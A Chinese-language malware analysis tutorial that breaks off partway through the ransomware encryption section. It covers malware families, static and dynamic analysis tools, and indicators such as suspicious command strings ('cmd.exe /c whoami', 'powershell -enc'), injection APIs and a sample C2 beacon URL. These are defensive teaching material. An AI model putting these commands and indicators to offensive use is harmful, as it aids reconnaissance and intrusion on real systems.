# 恶意代码分析基础

> 本文档系统介绍恶意代码分析的基础知识，包括恶意代码分类、静态分析方法、动态分析方法、勒索软件分析要点、常见免杀技术和分析工具介绍。

---

## 一、恶意代码分类

### 1.1 病毒（Virus）

**定义**

病毒是一种能够自我复制并感染其他程序的恶意代码。病毒需要将自身代码附加或注入到宿主程序中，当用户运行被感染的程序时，病毒代码才会执行并继续感染其他程序。

**病毒的组成部分**

1. **感染模块**：负责将病毒代码复制到其他文件或系统中
2. **触发模块**：判断何时触发病毒的有效载荷（特定日期、特定条件等）
3. **有效载荷（Payload）**：病毒的实际破坏功能（删除文件、窃取数据等）

**病毒的传播方式**

- 文件感染：感染可执行文件（.exe、.dll、.com 等）
- 引导扇区病毒：感染硬盘的主引导记录（MBR）或引导扇区
- 宏病毒：感染文档中的宏（Word、Excel 等）
- 脚本病毒：VBScript、JavaScript、Python 等脚本语言编写
- 蠕虫化病毒：具有蠕虫特性的病毒

**著名病毒案例**

| 病毒名称 | 出现时间 | 特点 |
|----------|----------|------|
| Creeper | 1971 | 最早的计算机病毒（实验性） |
| Brain | 1986 | 第一个 IBM PC 病毒，引导扇区病毒 |
| Morris Worm | 1988 | 第一个互联网蠕虫，感染 6000+ 台计算机 |
| Melissa | 1999 | 宏病毒，通过电子邮件传播 |
| ILOVEYOU | 2000 | VBS 脚本蠕虫，造成 55-87 亿美元损失 |
| Code Red | 2001 | 利用 IIS 漏洞的蠕虫 |
| SQL Slammer | 2003 | 利用 SQL Server 漏洞，传播速度极快 |
| Conficker | 2008 | 利用 MS08-067 漏洞，感染数百万台计算机 |

### 1.2 木马（Trojan）

**定义**

木马（Trojan Horse）是一种伪装成正常程序的恶意软件。用户以为运行的是有用的程序，但实际上执行的是恶意操作。木马不会自我复制，这是它与病毒和蠕虫的主要区别。

**木马的常见类型**

| 类型 | 功能 |
|------|------|
| 远控木马（RAT） | 允许攻击者远程控制受害者计算机 |
| 后门木马（Backdoor） | 为攻击者提供绕过正常认证的访问通道 |
| 下载器/投放器（Downloader/Dropper） | 下载和执行其他恶意软件 |
| 银行木马（Banking Trojan） | 窃取银行账户和凭据信息 |
| 间谍软件（Spyware） | 监视和收集用户活动信息 |
| 密码窃取木马 | 窃取各种密码和凭据 |
| 单击欺诈木马 | 模拟用户点击进行广告欺诈 |
| DDoS 木马 | 用于发动分布式拒绝服务攻击 |

**著名木马案例**

| 木马名称 | 类型 | 特点 |
|----------|------|------|
| Back Orifice | 远控木马 | 1998年发布，经典的 Windows 远控木马 |
| SubSeven | 远控木马 | 2000年代流行的远控木马 |
| Zeus/Zbot | 银行木马 | 窃取银行凭据，广泛传播 |
| SpyEye | 银行木马 | Zeus 的竞争对手/继承者 |
| Emotet | 银行木马/下载器 | 最初是银行木马，后演变为恶意软件分发平台 |
| Gh0st RAT | 远控木马 | 中国背景的远控木马，常用于 APT 攻击 |
| Poison Ivy | 远控木马 | 广泛使用的远控木马框架 |
| Cobalt Strike | 远控工具 | 商业化渗透测试工具，常被攻击者滥用 |

### 1.3 蠕虫（Worm）

**定义**

蠕虫是一种能够自我复制并通过网络传播的恶意代码。与病毒不同，蠕虫不需要宿主程序，可以独立运行和传播。蠕虫通常利用漏洞或弱口令进行传播。

**蠕虫的特点**

1. **独立性**：不需要宿主程序，可以独立运行
2. **自我复制**：能够自动复制自身到其他系统
3. **网络传播**：通过网络进行传播
4. **快速传播**：可以在短时间内感染大量系统

**蠕虫的传播方式**

- 漏洞利用：利用操作系统或应用程序的漏洞
- 弱口令破解：通过 SSH、RDP、SMB 等协议的弱口令
- 电子邮件：通过邮件附件或链接传播
- 即时通讯：通过 IM 软件传播
- P2P 网络：通过点对点文件共享传播
- 移动存储：通过 U 盘等移动存储设备传播
- 供应链攻击：通过软件更新或下载渠道传播

**著名蠕虫案例**

| 蠕虫名称 | 出现时间 | 利用漏洞 | 影响 |
|----------|----------|----------|------|
| Morris Worm | 1988 | fingerd、sendmail 漏洞 | 感染约 6000 台计算机 |
| Code Red | 2001 | IIS 索引服务缓冲区溢出 | 感染 35 万+ 服务器 |
| SQL Slammer | 2003 | SQL Server 缓冲区溢出 | 10 分钟内感染 7.5 万台服务器 |
| Blaster | 2003 | Windows DCOM RPC 漏洞 | 感染数百万台计算机 |
| Sasser | 2004 | Windows LSASS 漏洞 | 感染数百万台计算机 |
| Conficker | 2008 | MS08-067 | 感染 900 万-1500 万台计算机 |
| Stuxnet | 2010 | 多个零日漏洞 | 破坏伊朗核设施离心机 |
| WannaCry | 2017 | MS17-010（永恒之蓝） | 感染 150+ 国家 30 万+ 计算机 |

### 1.4 勒索软件（Ransomware）

**定义**

勒索软件是一种加密用户文件并要求支付赎金以恢复访问的恶意软件。近年来，勒索软件已经成为最严重的网络安全威胁之一。

**勒索软件的发展历程**

1. **第一代（2005-2010）**：早期勒索软件，加密技术简单，易于解密
2. **第二代（2011-2015）**：使用强加密算法，网络犯罪专业化
3. **第三代（2016-2019）**：勒索即服务（RaaS）兴起，双重勒索出现
4. **第四代（2020-至今）**：三重勒索、供应链攻击、针对关键基础设施

**勒索软件的常见特征**

1. **文件加密**：使用 RSA + AES 等加密算法加密用户文件
2. **勒索信**：留下说明如何支付赎金的文本/网页文件
3. **加密文件后缀**：给加密文件添加特定后缀（.encrypted、.locky、.wnry 等）
4. **比特币支付**：通常要求用加密货币支付赎金
5. **倒计时**：设置支付期限，逾期涨价或销毁密钥

**双重勒索和三重勒索**

- **单一勒索**：只加密文件，要求赎金解密
- **双重勒索**：先窃取数据，再加密文件；不支付就泄露数据
- **三重勒索**：加密 + 数据泄露 + DDoS 攻击受害者合作伙伴

**著名勒索软件家族**

| 家族名称 | 出现时间 | 特点 |
|----------|----------|------|
| CryptoLocker | 2013 | 第一个大规模传播的勒索软件 |
| CryptoWall | 2014 | CryptoLocker 的继承者/模仿者 |
| TeslaCrypt | 2015 | 针对游戏玩家数据 |
| Locky | 2016 | 通过钓鱼邮件大规模传播 |
| Cerber | 2016 | RaaS 模式，提供勒索软件即服务 |
| WannaCry | 2017 | 利用永恒之蓝漏洞全球传播 |
| Petya/NotPetya | 2017 | 加密 MBR，破坏性极强 |
| Ryuk | 2018 | 针对企业的高价值目标 |
| GandCrab | 2018 | RaaS 模式，传播迅速 |
| REvil/Sodinokibi | 2019 | 知名 RaaS 团伙 |
| Conti | 2020 | 针对医疗机构和政府 |
| DarkSide | 2021 | 攻击 Colonial Pipeline |
| LockBit | 2022 | 当前最活跃的勒索软件家族之一 |
| BlackCat/ALPHV | 2022 | Rust 编写，功能强大 |
| Cl0p | 2023 | 利用 MOVEit 漏洞进行供应链攻击 |

**勒索即服务（RaaS）**

RaaS 是一种商业模式，勒索软件开发者将勒索软件作为服务提供给其他犯罪分子（附属者），按比例分成赎金。这种模式大大降低了勒索攻击的门槛，导致勒索软件数量激增。

RaaS 通常提供：
- 勒索软件构建器
- 支付处理系统
- 受害者管理面板
- 技术支持
- 解密服务

### 1.5 挖矿木马（Miner）

**定义**

挖矿木马是一种利用受害者计算机的计算资源来挖掘加密货币的恶意软件。由于挖矿需要大量计算资源，挖矿木马会导致系统变慢、CPU 使用率飙升、电费增加。

**常见的挖矿目标货币**

- **Monero (XMR)**：最常见，因为其挖矿算法（RandomX）适合 CPU 挖掘，且隐私性好
- **Bitcoin (BTC)**：现在主要用 ASIC 矿机，普通 CPU/GPU 不划算
- **Ethereum (ETH)**：主要用 GPU 挖掘，2022 年转向 PoS 后不再挖矿
- **其他隐私币**：ZCash、Dash 等

**传播方式**

- 网页挖矿（Coinhive 等，已被关闭）
- 钓鱼邮件下载
- 漏洞利用（如 EternalBlue）
- 软件捆绑
- 服务器入侵后植入
- 供应链攻击
- 容器和云环境入侵

**著名挖矿木马**

| 名称 | 特点 |
|------|------|
| XMRig（被恶意利用） | 开源的 XMR 挖矿程序，常被攻击者滥用 |
| Coinhive | 网页挖矿脚本，曾被大量滥用 |
| WannaMine | 利用永恒之蓝传播的挖矿蠕虫 |
| SystemdMiner | 伪装成 systemd 服务 |
| Kwork | 针对 Linux 服务器的挖矿木马 |
| GuardMiner | 利用永恒之蓝传播的挖矿木马 |
| LemonDuck | 多功能恶意软件，包含挖矿模块 |

**检测特征**

- CPU/显卡使用率持续高位
- 存在未知的挖矿进程（xmrig、minerd、cpuminer 等）
- 连接到矿池地址（pool.supportxmr.com、minexmr.com 等）
- 系统明显变慢，风扇狂转
- 服务器电费异常增加

### 1.6 僵尸网络（Botnet）

**定义**

僵尸网络是由大量被攻陷的计算机（僵尸/肉鸡）组成的网络，由攻击者（僵尸牧人）集中控制。僵尸网络可以用于发动 DDoS 攻击、发送垃圾邮件、挖矿、分发恶意软件等。

**僵尸网络的架构**

1. **IRC 型**：使用 IRC 频道作为 C2 信道（早期常见）
2. **HTTP 型**：使用 HTTP 协议与 C2 通信
3. **P2P 型**：点对点结构，无中心 C2，更难摧毁
4. **域名生成算法（DGA）型**：定期生成大量域名作为 C2 地址
5. **社交媒体型**：使用 Twitter、Reddit 等社交媒体作为 C2

**僵尸网络的用途**

- DDoS 攻击：分布式拒绝服务攻击
- 发送垃圾邮件（Spam）
- 点击欺诈（Click fraud）
- 加密货币挖矿
- 分发恶意软件
- 窃取凭据和数据
- 代理服务（匿名访问）

**著名僵尸网络**

| 名称 | 出现时间 | 规模 | 用途 |
|------|----------|------|------|
| Botnet Zero | 2000 | - | 早期僵尸网络 |
| Agobot/Phatbot | 2003 | - | 模块化 IRC 僵尸网络 |
| Srizbi | 2007 | 数十万 | 发送垃圾邮件 |
| Storm Worm | 2007 | 百万级 | P2P 僵尸网络 |
| Conficker | 2008 | 千万级 | 史上最大规模僵尸网络之一 |
| Mariposa | 2009 | 数百万 | 窃取凭据 |
| Kelihos | 2010 | 数十万 | 垃圾邮件、比特币盗窃 |
| Mirai | 2016 | 百万级 | IoT 僵尸网络，DDoS 攻击 |
| Emotet | 2014 | 数十万 | 恶意软件分发平台 |
| TrickBot | 2016 | 数十万 | 银行木马 + 僵尸网络 |

**Mirai 僵尸网络**

Mirai 是专门针对物联网（IoT）设备的僵尸网络，通过扫描弱口令（默认用户名密码）感染路由器、摄像头、DVR 等设备。

Mirai 特点：
- 针对物联网设备（Linux ARM/MIPS 架构）
- 使用 60+ 种默认凭据进行暴力破解
- 发动大规模 DDoS 攻击
- 2016 年攻击 Dyn DNS，导致美国大面积断网
- 源代码已公开，衍生出大量变种

## 二、静态分析方法

### 2.1 文件特征分析

**文件类型识别**

```
Windows 平台（PE 文件）：
- 特征签名：MZ（0x4D 0x5A）
- 文件扩展名：.exe, .dll, .sys, .ocx, .scr, .drv
- PE 头签名：PE\0\0（0x50 0x45 0x00 0x00）

Linux 平台（ELF 文件）：
- 特征签名：\x7FELF（0x7F 0x45 0x4C 0x46）
- 文件扩展名：无（可执行文件）, .so, .o
- ELF 类型：ET_EXEC（可执行）, ET_DYN（共享库）, ET_REL（目标文件）

其他类型：
- 脚本文件：.vbs, .js, .ps1, .bat, .cmd, .py, .sh
- 文档文件（含宏）：.doc, .xls, .ppt, .pdf
- 压缩包：.zip, .rar, .7z, .tar, .gz
- Java：.jar, .class
- .NET：.exe, .dll（PE 格式，但包含 CLR 头）
```

**文件哈希计算**

```bash
# MD5
md5sum file.exe
Get-FileHash -Algorithm MD5 file.exe

# SHA-1
sha1sum file.exe
Get-FileHash -Algorithm SHA1 file.exe

# SHA-256
sha256sum file.exe
Get-FileHash -Algorithm SHA256 file.exe

# SHA-512
sha512sum file.exe
Get-FileHash -Algorithm SHA512 file.exe
```

**文件大小和熵值**

```
熵值（Entropy）衡量文件数据的随机性：
- 低熵（< 6）：文件可能未加密/未压缩
- 中高熵（6-7.5）：文件可能经过压缩或简单加密
- 高熵（接近 8）：文件很可能经过强加密或加壳

工具：
- Detect It Easy (DIE)：熵值分析
- PEiD：查壳工具
- ent：命令行熵值计算工具
- x64dbg：内存熵值分析
```

**数字签名验证**

```
数字签名可以验证文件的来源和完整性。
恶意软件通常没有有效签名，或者使用伪造的签名。

Windows 签名验证：
- signtool verify /pa /v file.exe
- Get-AuthenticodeSignature file.exe
- 查看文件属性 → 数字签名

Linux 签名验证：
- dpkg-sig --verify package.deb （Debian 包）
- rpm -K package.rpm （RPM 包）
```

### 2.2 字符串分析

**字符串分析的作用**

字符串分析是静态分析的重要步骤，通过提取文件中的可打印字符串，可以获取大量有用信息：

- IP 地址和域名（C2 服务器地址）
- URL 和路径
- 命令行参数
- 注册表键路径
- 文件名和目录
- 加密密钥和密码
- 错误信息和提示信息
- 加壳器/编译器特征
- 互斥体名称
- 配置信息

**字符串提取工具**

```bash
# Windows 工具：
# - Strings（Sysinternals）
# - IDA Pro 字符串窗口
# - Ghidra 字符串搜索
# - x64dbg 字符串搜索
# - PEStudio

# Linux 工具：
strings file.exe
strings -n 8 file.exe  # 最小长度 8 个字符
strings -a file.exe   # 扫描整个文件（默认只扫描数据段）
strings -t x file.exe  # 显示偏移地址（十六进制）

# 提取 Unicode 字符串
strings -el file.exe
```

**常见可疑字符串特征**

```
网络相关：
- http://、https://、ftp://
- IP 地址格式：xxx.xxx.xxx.xxx
- 域名：example.com、xxx.ddns.net
- 端口号：:4444、:8080
- User-Agent 字符串
- "Mozilla/" 等 HTTP 头

系统相关：
- "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"（启动项）
- "cmd.exe /c"、"/c start"、"powershell -enc"（命令执行）
- "svchost.exe"、"explorer.exe"（可能用于注入）
- "\\Temp\\"、"\\AppData\\"（常见写入路径）

安全相关：
- "IsDebuggerPresent"、"CheckRemoteDebuggerPresent"（反调试）
- "VirtualProtect"、"VirtualAlloc"（内存操作）
- "CreateRemoteThread"（进程注入）
- "ADVAPI32.dll"、"ntdll.dll"（系统 DLL）

加密相关：
- "AES"、"RSA"、"XOR"、"RC4"
- 明显的 Base64 字符串
- 长串无意义字符（可能是加密的配置或 Shellcode）

勒索软件特征：
- "README"、"INSTRUCTION"、"DECRYPT"
- "bitcoin"、".onion"、"Tor"
- 加密文件后缀列表
- 钱包地址格式
```

**字符串分析案例**

```
分析一个可疑的 PE 文件，提取字符串后发现：

1. "http://192.168.1.100:4444/beacon" 
   → 可能是 C2 服务器地址，beacon 模式常见于 Cobalt Strike

2. "cmd.exe /c whoami && ipconfig"
   → 执行系统命令，信息收集

3. "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
   → 注册表启动项持久化

4. "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
   → 伪造的 User-Agent，用于 HTTP 通信

5. "VirtualAlloc"、"CreateRemoteThread"、"WriteProcessMemory"
   → 进程注入相关函数

6. "IsDebuggerPresent"、"GetTickCount"
   → 反调试和反沙箱函数

7. "aHR0cDovL2V4YW1wbGUuY29tL2JhY2tkb29y"
   → Base64 编码，解码后可能是 C2 地址

综合判断：这很可能是一个远控木马（RAT）或后门程序。
```

### 2.3 导入表分析

**导入表的作用**

导入表（Import Table）记录了程序从哪些 DLL 导入了哪些函数。分析导入表可以快速了解程序的功能和行为特征。

**PE 导入表结构**

```
PE 文件的导入表位于 .idata 节（通常与 .rdata 合并），包含：
1. 导入 DLL 列表（每个 DLL 对应一个 IMAGE_IMPORT_DESCRIPTOR）
2. 导入函数名称列表（INT - Import Name Table）
3. 导入地址表（IAT - Import Address Table）
```

**导入表查看工具**

```bash
# 查看导入表
# 工具：Dependency Walker (depends.exe)
# 工具：PEiD
# 工具：CFF Explorer
# 工具：IDA Pro / Ghidra

# 命令行工具：
dumpbin /imports file.exe
objdump -p file.exe | grep -A 100 "DLL Name"
readelf -d file.so  # ELF 文件
```

**常见可疑导入函数分类**

### 2.4 加壳识别

**什么是加壳**

加壳是指通过特殊算法修改可执行文件，将原始代码和数据加密或压缩，运行时先执行壳代码解密/解压原始代码，再跳转到原始入口点执行。加壳最初用于软件保护和反盗版，但也被恶意软件广泛用于免杀和反分析。

**加壳的分类**

| 类型 | 特点 | 示例 |
|------|------|------|
| 压缩壳 | 仅压缩代码和数据，保护程度低 | UPX、MPRESS、PECompact |
| 加密壳 | 加密代码和数据，带有反调试、反分析 | ASProtect、Armadillo |
| 虚拟化壳 | 将代码转换为自定义虚拟机指令，强度最高 | VMProtect、Themida、Obsidium |
| 混淆器 | 代码混淆、控制流平坦化等 | Obfuscator-LLVM、VMProtect |

**常见加壳器**

| 加壳器 | 类型 | 平台 | 说明 |
|--------|------|------|------|
| UPX | 压缩壳 | 多平台 | 最常见的开源压缩壳，易于脱壳 |
| MPRESS | 压缩壳 | Windows | 免费的压缩壳 |
| PECompact | 压缩壳 | Windows | 带一些保护功能的压缩壳 |
| ASProtect | 加密壳 | Windows | 经典加密壳，带反调试 |
| Armadillo | 加密壳 | Windows | 带多种保护机制 |
| ExeCryptor | 加密壳 | Windows | 代码变形 + 虚拟化 |
| VMProtect | 虚拟化壳 | 多平台 | 代码虚拟化，强度很高 |
| Themida | 虚拟化壳 | Windows | WinLicense 的保护引擎 |
| Obsidium | 加密壳 | Windows | 带授权管理 |
| Enigma Protector | 加密壳 | Windows | 功能丰富的保护工具 |

**加壳识别方法**

**方法1：查壳工具**

```
最常用的查壳工具：
- PEiD：经典查壳工具，特征库丰富（已停止更新）
- Detect It Easy (DIE)：功能强大的查壳工具，持续更新
- Exeinfo PE：另一个流行的查壳工具
- CFF Explorer：PE 编辑器，也有查壳功能
- FileAlyzer：文件分析工具
```

**方法2：节区分析**

```
加壳后的程序通常有特殊的节区名称：
- UPX: UPX0, UPX1, UPX2
- ASProtect: .aspack, .adata
- VMProtect: .vmp0, .vmp1, .vmp2
- Themida: .themida, .taz, .per
- Enigma: .enigma1, .enigma2

节区特征：
- 入口点不在 .text 节，而在最后一个节（壳代码节）
- .text 节的 VirtualSize 远大于 SizeOfRawData
- 节区名称奇怪或无意义
- 只有少量节区
```

**方法3：导入表分析**

```
加壳后导入表通常很简单：
- 只有少量导入函数
- 常见函数：LoadLibraryA/W, GetProcAddress
- 可能只有 kernel32.dll 和 ntdll.dll
- 运行时动态解析其他导入函数
```

**方法4：入口点分析**

```
入口点（AddressOfEntryPoint）特征：
- 入口点在最后一个节中
- 入口点代码是异常的解码/解压循环
- IDA 打开后只有少量代码能识别
```

**方法5：熵值分析**

```
加壳后文件熵值通常较高：
- 原始 PE 文件熵值约 5-6
- 压缩后熵值约 7-7.5
- 强加密后熵值接近 8
- 熵值高的节区通常是加密的数据区
```

**UPX 脱壳方法**

```bash
# 方法1：使用 UPX 自带脱壳功能
upx -d file.exe -o unpacked.exe

# 方法2：手动脱壳（ESP 定律 - 适用于很多压缩壳）
# 1. 用 x64dbg 打开加壳程序
# 2. 在入口点，观察 ESP 寄存器
# 3. 在 ESP 指向的地址下硬件写入断点（HW break on access）
# 4. 按 F9 运行，程序会断在 OEP 附近
# 5. 确认到达 OEP（原始入口点）
# 6. 使用 Scylla 插件：
#    - IAT Autosearch
#    - Get Imports
#    - Dump 进程
#    - Fix Dump（修复 IAT）

# 方法3：使用专用脱壳工具
# - QuickUnpack
# - Universal Unpacker
# - 各种专用脱壳脚本
```

### 2.5 资源分析

**PE 资源节**

PE 文件的资源节（.rsrc）包含各种资源数据，恶意软件常利用资源节存储恶意代码、配置信息、解密后的 payload 等。

**常见资源类型**

| 类型 ID | 类型名 | 说明 |
|---------|--------|------|
| 1 | RT_CURSOR | 光标资源 |
| 2 | RT_BITMAP | 位图资源 |
| 3 | RT_ICON | 图标资源 |
| 4 | RT_MENU | 菜单资源 |
| 5 | RT_DIALOG | 对话框资源 |
| 6 | RT_STRING | 字符串资源 |
| 9 | RT_ACCELERATOR | 快捷键表 |
| 11 | RT_VERSION | 版本信息 |
| 24 | RT_MANIFEST | 程序清单（Manifest） |
| 自定义 | 自定义 | 攻击者自定义的资源类型 |

**资源分析工具**

```
- Resource Hacker：查看和编辑 PE 资源
- Resource Tuner：资源编辑工具
- IDA Pro：查看资源节
- CFF Explorer：PE 编辑器，可查看资源
- PEView：PE 结构查看器
- x64dbg：内存中查看资源
```

**恶意软件利用资源的常见方式**

1. **存储 Payload**：将加密的恶意代码存储在资源中，运行时解密执行
2. **存储配置**：C2 地址、加密密钥、版本信息等
3. **存储其他文件**：DLL、驱动、配置文件等
4. **伪造版本信息**：伪造正常软件的版本信息和图标
5. **本地化字符串**：不同语言的勒索信等

**资源分析技巧**

```
1. 查看资源节的大小和熵值
   - 异常大的资源节可能包含加密的 payload
   - 高熵值的资源可能是加密数据

2. 检查自定义资源类型
   - 正常程序通常使用标准资源类型
   - 自定义类型和命名可能是可疑的

3. 提取和分析资源数据
   - 提取资源数据到文件
   - 分析是否是 PE 文件（MZ 头）
   - 分析是否是加密数据
   - 尝试常见的解密方法（XOR、AES 等）

4. 版本信息检查
   - 检查版本信息是否合理
   - 对比公司名、产品名是否与文件实际功能一致
   - 检查数字签名是否有效
```

## 三、动态分析方法

### 3.1 动态分析概述

**什么是动态分析**

动态分析是指在受控环境中运行恶意代码，观察其行为的分析方法。与静态分析相比，动态分析可以更直观地了解恶意代码的实际行为，但需要安全的分析环境。

**动态分析的优缺点**

| 优点 | 缺点 |
|------|------|
| 可以观察恶意代码的实际行为 | 需要安全的隔离环境 |
| 可以分析加壳/混淆的代码 | 恶意代码可能检测分析环境 |
| 更容易理解恶意代码的功能 | 可能触发恶意行为造成破坏 |
| 可以获取网络行为特征 | 某些行为可能需要特定条件触发 |
| 可以提取运行时解密的代码 | 分析时间较长 |

**分析环境搭建**

```
分析环境基本要求：
1. 隔离网络：物理隔离或虚拟网络隔离
2. 虚拟机：VMware、VirtualBox、Hyper-V 等
3. 快照功能：分析前保存快照，分析后恢复
4. 分析工具：各种监控和分析工具

推荐分析环境：
- Windows XP/7/10/11 虚拟机
- REMnux：Linux 恶意软件分析发行版
- Flare VM：Windows 恶意软件分析环境
- Cuckoo Sandbox：自动化沙箱
- ANY.RUN：交互式在线沙箱
- Joe Sandbox：高级沙箱分析
```

**动态分析安全注意事项**

1. 确保分析环境与生产网络隔离
2. 使用虚拟机并保存干净快照
3. 不要在物理机上直接运行恶意代码
4. 分析后立即恢复快照
5. 重要数据做好备份
6. 遵守法律法规，仅分析授权的样本

### 3.2 进程行为监控

**进程监控工具**

**Process Monitor (ProcMon)**

```
Process Monitor 是 Sysinternals 工具集的核心工具之一，
可以实时监控进程的文件系统、注册表、网络和进程/线程操作。

主要功能：
- 实时监控文件系统操作
- 实时监控注册表操作
- 实时监控网络操作
- 实时监控进程/线程操作
- 强大的过滤功能
- 启动时监控（boot logging）

常用过滤条件：
- Process Name → 只监控特定进程
- Path → 只监控特定路径
- Operation → 只监控特定操作类型
- Result → 只看成功/失败的操作
- PID → 只监控特定进程 ID

分析技巧：
1. 先设置过滤再运行恶意程序，减少噪音
2. 关注 WriteFile、CreateFile 等写入操作
3. 关注 RegSetValue 等注册表写入操作
4. 关注 CreateProcess 等进程创建操作
5. 使用 Ctrl+F 搜索特定关键词
```

**Process Explorer**

```
Process Explorer 是增强版的任务管理器，可以查看进程的详细信息。

主要功能：
- 进程树视图
- 查看进程加载的 DLL
- 查看进程打开的句柄
- 验证进程签名
- 查看进程的网络连接
- 替换任务管理器

分析用途：
1. 发现隐藏或可疑的进程
2. 检查进程注入（异常 DLL、异常路径）
3. 查看父子进程关系
4. 验证数字签名
5. 查看进程的 TCP/UDP 连接
```

**进程创建监控**

```
监控进程创建的方法：

1. Process Monitor 过滤
   Operation = Process Create

2. Sysmon（系统监控）
   事件 ID 1：进程创建
   事件 ID 5：进程终止

3. 安全审计
   事件 ID 4688：进程创建
   需要启用审核策略 + 命令行审计

4. WMI 事件订阅
   监控 __InstanceCreationEvent of Win32_Process

关键分析点：
- 父进程和子进程关系是否正常
- 进程路径是否在临时目录或用户目录
- 命令行参数是否可疑
- 进程是否有有效签名
- 是否创建了大量子进程
```

### 3.3 文件系统监控

**文件监控方法**

```
1. Process Monitor
   过滤文件操作：Operation 包含 File
   关注：CreateFile、WriteFile、DeleteFile、SetDispositionInformationFile

2. Regshot
   对比恶意程序运行前后的注册表和文件系统变化
   使用方法：
   - 运行 Regshot，拍摄第一张快照（First Shot）
   - 运行恶意程序并等待其执行完成
   - 拍摄第二张快照（Second Shot）
   - 对比差异（Compare）

3. inotifywait（Linux）
   inotifywait -m -r /tmp /etc -e create,modify,delete

4. 文件系统过滤驱动
   如 FileMon（已被 ProcMon 取代）
```

**常见文件操作行为**

| 行为 | 可能的目的 |
|------|-----------|
| 在临时目录创建文件 | 释放 payload、临时文件 |
| 在启动目录创建文件 | 持久化 |
| 修改系统文件 | 破坏系统、Rootkit |
| 加密用户文件 | 勒索软件 |
| 窃取文档文件 | 间谍软件、数据窃取 |
| 删除自身 | 自我销毁、痕迹清理 |
| 创建大量文件 | 蠕虫、病毒感染 |
| 修改 hosts 文件 | 劫持网络访问 |

**勒索软件文件行为特征**

```
1. 大量文件被修改/重命名
   - 文件被加密并添加新的后缀
   - 修改数量：通常是数千到数万个文件

2. 特定文件类型被加密
   - 文档：.doc, .docx, .xls, .xlsx, .ppt, .pdf
   - 图片：.jpg, .png, .bmp
   - 压缩包：.zip, .rar, .7z
   - 数据库：.mdb, .sql, .bak
   - 源代码：.cpp, .py, .java

3. 创建勒索信文件
   - README.txt、README_加密.txt
   - 通常在每个目录下都有一份
   - 文件名包含特定关键字

4. 文件读写模式
   - 先读取原文件内容
   - 加密后写入新文件
   - 删除或重命名原文件
```

### 3.5 网络行为监控

**网络监控工具**

**Wireshark**

```
Wireshark 是最流行的网络协议分析工具，可以捕获和分析网络流量。

常用过滤规则：
- ip.addr == 192.168.1.100  → 特定 IP 地址
- tcp.port == 4444            → 特定 TCP 端口
- http                         → HTTP 协议
- dns                          → DNS 协议
- http.request.method == POST  → HTTP POST 请求
- tcp.flags.reset == 1         → RST 包

分析恶意软件网络流量的技巧：
1. 先运行恶意程序前开始抓包
2. 过滤掉正常的系统流量
3. 关注可疑的出站连接
4. 分析 HTTP 请求的 URL、User-Agent、Cookie
5. 分析 DNS 查询（特别是 DGA 域名）
6. 关注非标准端口的连接
7. 检查加密流量的证书信息
```

**TCPView / Process Explorer**

```
TCPView 可以实时查看所有 TCP/UDP 连接及其对应的进程。

分析用途：
1. 发现可疑的网络连接
2. 查看连接的远程地址和端口
3. 查看连接所属的进程
4. 识别哪些进程在监听端口

关注要点：
- 监听非标准端口的进程
- 连接到可疑 IP/域名的进程
- 大量出站连接（可能是扫描或 C2 通信）
- 系统进程（如 svchost.exe）的异常连接
```

**FakeNet / INetSim**

```
FakeNet 和 INetSim 是网络模拟工具，可以模拟各种网络服务，
使恶意软件认为自己连接到了真实的 C2 服务器。

FakeNet-NG 功能：
- DNS 模拟：解析所有域名为指定 IP
- HTTP/HTTPS 模拟：响应 HTTP 请求
- SMTP/POP3/IMAP 模拟：邮件服务模拟
- FTP 模拟：文件传输模拟
- 其他常见服务模拟

使用场景：
1. 让恶意软件正常运行（需要网络才能运行的恶意软件）
2. 捕获恶意软件的网络请求
3. 分析恶意软件的通信协议
4. 触发更多行为（如下载 payload）
```

**常见网络行为特征**

```
HTTP C2 通信特征：
- 定期回连（beacon），间隔固定或随机
- 使用特定的 User-Agent（常见、随机或伪造）
- 特定的 URL 路径（如 /news、/login、/api）
- POST 请求上传数据，GET 请求下载命令
- 数据编码：Base64、URL 编码、自定义编码
- Cookie 中包含数据
- HTTP 头异常（缺失、顺序异常等）

DNS 隧道特征：
- 大量 DNS 查询
- 查询的子域名异常长
- 子域名看起来像随机字符串
- TXT 记录返回数据
- 查询频率高

加密流量特征：
- 非标准端口的 SSL/TLS 流量
- 自签名证书或无效证书
- 异常的 JA3 指纹
- 流量模式异常（心跳包、固定大小数据包）

常见 C2 端口：
- 4444：Metasploit 默认端口
- 8080、8443：常用替代端口
- 53：DNS 隧道
- 443：伪装成 HTTPS
- 22：伪装成 SSH
```


**沙箱的局限性**

```
1. 反沙箱技术
   恶意软件可以检测沙箱环境，检测到后不执行恶意行为：
   - 检测虚拟机（VMware、VirtualBox 特征）
   - 检测分析工具（ProcMon、Wireshark 等）
   - 检测沙箱特有的文件、注册表、进程

   - 检测用户交互（鼠标移动、键盘输入）

2. 环境差异
   - 沙箱环境与真实环境可能存在差异
   - 某些恶意软件需要特定条件才能运行
   - 网络条件可能不同（是否有真实网络访问）

3. 行为不完全触发
   - 有些功能需要特定命令才执行
   - 有些行为需要 C2 指令触发
   - 有些恶意软件有多阶段 payload
```

## 四、勒索软件分析要点

### 4.1 勒索软件的典型行为

**感染阶段**

1. **初始访问**：钓鱼邮件、漏洞利用、弱口令、横向移动
2. **执行投递器**：运行下载器或初始 payload
3. **权限提升**：利用漏洞或配置错误获取管理员权限
4. **持久化**：创建服务、注册表启动项、计划任务等
5. **防御规避**：禁用安全软件、删除卷影副本、白名单利用

**侦察阶段**

1. **系统信息收集**：操作系统版本、网络配置、已安装软件
2. **网络扫描**：扫描内网其他主机
3. **凭据窃取**：从内存中提取密码哈希（Mimikatz 等）
4. **数据窃取**：在加密前窃取敏感数据（双重勒索）

**加密阶段**

1. **生成加密密钥**：生成随机的 AES 对称密钥
2. **加密文件**：使用 AES 密钥加密用户文件
3. **加密密钥保护**：使用 RSA 公钥加密 AES 密钥（随文件保存）
4. **修改文件后缀**：给加密文件添加特定后缀
5. **创建勒索信**：在每个目录放置勒索说明

**勒索阶段**

1. **显示勒索信息**：弹出勒索窗口、更改桌面背景、创建勒索信文件
2. **提供联系方式**：Tor 网站、邮件、即时通讯等
3. **设置倒计时**：限时支付，逾期涨价或销毁密钥
4. **支付验证**：验证支付后提供解密工具/密钥

### 4.2 勒索软件加密算法分析

**常见加密方案**

勒索软件通常采用混合加密方案：

```
混合加密流程：
1. 生成随机的 AES 密钥（对称加密，速度快，适合加密大量文件）
